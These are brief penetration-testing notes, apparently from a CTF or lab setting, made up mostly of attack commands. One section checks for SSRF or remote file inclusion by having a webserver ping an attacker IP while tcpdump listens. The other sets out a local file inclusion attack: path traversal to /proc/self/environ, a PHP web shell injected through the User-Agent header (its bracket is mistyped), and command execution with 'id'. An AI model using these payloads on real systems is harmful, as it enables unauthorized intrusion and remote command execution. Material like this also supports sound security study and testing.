### check for ssrf or RFI 

```
kali
sudo tcpdump icmp -i tun0

Webserver
python3 <webserver-url> -c "ping -c4 <attacker-ip>"
``` 

### LFI
```
file=../../../../../proc/self/environ

change user-agent: <?php system[$_GET['cmd']); ?>

<url>/console?file=../../../../../proc/self/environ?cmd=id
```
